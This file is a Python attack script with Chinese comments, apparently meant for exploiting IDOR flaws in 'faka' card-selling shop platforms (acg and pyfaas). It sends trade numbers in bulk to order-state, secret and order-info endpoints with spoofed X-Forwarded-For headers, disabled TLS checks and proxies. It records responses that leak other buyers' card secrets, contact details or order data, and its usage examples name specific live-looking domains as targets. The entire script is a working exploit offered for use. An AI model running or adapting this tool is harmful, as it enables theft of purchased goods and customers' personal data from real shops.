#!/usr/bin/env python3
"""
发卡订单 IDOR / 信息泄露通用探测。

平台:
  acg     - /user/api/order/state, /user/api/index/secret, /user/api/index/query
  pyfaas  - /shopApi/Order/info

示例:
  python3 acg_idor.py -u https://zhanghao9.com --platform acg --trade-no 903260704032647527
  python3 acg_idor.py -u https://s.sggyx.com --platform pyfaas --token xiaoy --trade-no XXXXX
  python3 acg_idor.py -u https://zhanghao9.com --platform acg --trade-no 903260704032647527 --secret
  python3 acg_idor.py -u https://zhanghao9.com --platform acg --id-start 35 --id-end 45
"""
from __future__ import annotations

import argparse
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Any

import requests

from faka_common import DEFAULT_UA, ensure_out, json_or_text, log, random_xff_headers, save_hit


def hdr(use_xff: bool) -> dict[str, str]:
    h = {"User-Agent": DEFAULT_UA}
    if use_xff:
        h.update(random_xff_headers())
    return h


def acg_state(base: str, trade_no: str, timeout: int, proxy: str, use_xff: bool) -> Any:
    url = base.rstrip("/") + "/user/api/order/state"
    proxies = {"http": proxy, "https": proxy} if proxy else None
    r = requests.post(url, data={"tradeNo": trade_no}, headers=hdr(use_xff), timeout=timeout, proxies=proxies, verify=False)
    return json_or_text(r)


def acg_secret(base: str, order_id: str, password: str, timeout: int, proxy: str, use_xff: bool) -> Any:
    url = base.rstrip("/") + "/user/api/index/secret"
    proxies = {"http": proxy, "https": proxy} if proxy else None
    r = requests.post(url, data={"orderId": order_id, "password": password}, headers=hdr(use_xff), timeout=timeout, proxies=proxies, verify=False)
    return json_or_text(r)


def pyfaas_order(base: str, token: str, trade_no: str, query_password: str, timeout: int, proxy: str, use_xff: bool) -> Any:
    url = base.rstrip("/") + "/shopApi/Order/info"
    body = {"token": token, "trade_no": trade_no}
    if query_password:
        body["query_password"] = query_password
    proxies = {"http": proxy, "https": proxy} if proxy else None
    r = requests.post(url, json=body, headers={**hdr(use_xff), "Content-Type": "application/json"}, timeout=timeout, proxies=proxies, verify=False)
    return json_or_text(r)


def is_leak(platform: str, data: Any) -> bool:
    if not isinstance(data, dict):
        return False
    if platform == "acg":
        if data.get("code") == 200:
            d = data.get("data")
            if isinstance(d, dict) and d.get("status") == 1:
                return True
            if isinstance(d, dict) and any(k in d for k in ("trade_no", "amount", "id")):
                return True
        if data.get("secret") or (isinstance(data.get("data"), dict) and data["data"].get("secret")):
            return True
    if platform == "pyfaas":
        if data.get("code") == 1 and isinstance(data.get("data"), dict):
            inner = data["data"]
            if inner.get("card") or inner.get("contact") or inner.get("parentGoods"):
                return True
    return False


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="发卡订单 IDOR 探测")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--platform", choices=["acg", "pyfaas"], default="acg")
    ap.add_argument("--token", default="", help="pyfaas 必填")
    ap.add_argument("--trade-no", default="")
    ap.add_argument("--trade-list", default="", help="文件每行一个 trade_no")
    ap.add_argument("--secret", action="store_true", help="ACG 尝试拉 secret")
    ap.add_argument("--password", default="")
    ap.add_argument("--id-start", type=int, default=0)
    ap.add_argument("--id-end", type=int, default=0, help="配合 --id-list 生成伪 trade_no 不适用；用于批量 state 需 trade 列表")
    ap.add_argument("-w", "--workers", type=int, default=10)
    ap.add_argument("--timeout", type=int, default=15)
    ap.add_argument("--proxy", default="")
    ap.add_argument("--xff", action="store_true")
    ap.add_argument("--out", default="/data/tools/faka/out/idor_hits.jsonl")
    return ap.parse_args()


def main() -> None:
    args = parse_args()
    ensure_out(args.out)

    trade_nos: list[str] = []
    if args.trade_no:
        trade_nos.append(args.trade_no)
    if args.trade_list:
        with open(args.trade_list, encoding="utf-8", errors="ignore") as f:
            trade_nos.extend(x.strip() for x in f if x.strip())

    if not trade_nos:
        raise SystemExit("需要 --trade-no 或 --trade-list")

    log(f"IDOR {args.url} platform={args.platform} count={len(trade_nos)}")

    def task(tn: str):
        if args.platform == "pyfaas":
            if not args.token:
                raise SystemExit("pyfaas 需要 --token")
            data = pyfaas_order(args.url, args.token, tn, args.password, args.timeout, args.proxy, args.xff)
        else:
            data = acg_state(args.url, tn, args.timeout, args.proxy, args.xff)
            if args.secret:
                sec = acg_secret(args.url, tn, args.password, args.timeout, args.proxy, args.xff)
                if is_leak("acg", sec) or (isinstance(sec, dict) and sec.get("secret")):
                    return tn, True, {"state": data, "secret": sec}
        leaked = is_leak(args.platform, data)
        return tn, leaked, data

    hits = 0
    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        futs = {ex.submit(task, tn): tn for tn in trade_nos}
        for fut in as_completed(futs):
            tn, leaked, data = fut.result()
            brief = json.dumps(data, ensure_ascii=False)[:300]
            if leaked:
                hits += 1
                save_hit(Path(args.out), "idor_hit", {"trade_no": tn, "data": data})
                log(f"[+] LEAK {tn} -> {brief}")
            else:
                log(f"[-] {tn} -> {brief}")

    log(f"完成 hits={hits} -> {args.out}")


if __name__ == "__main__":
    main()
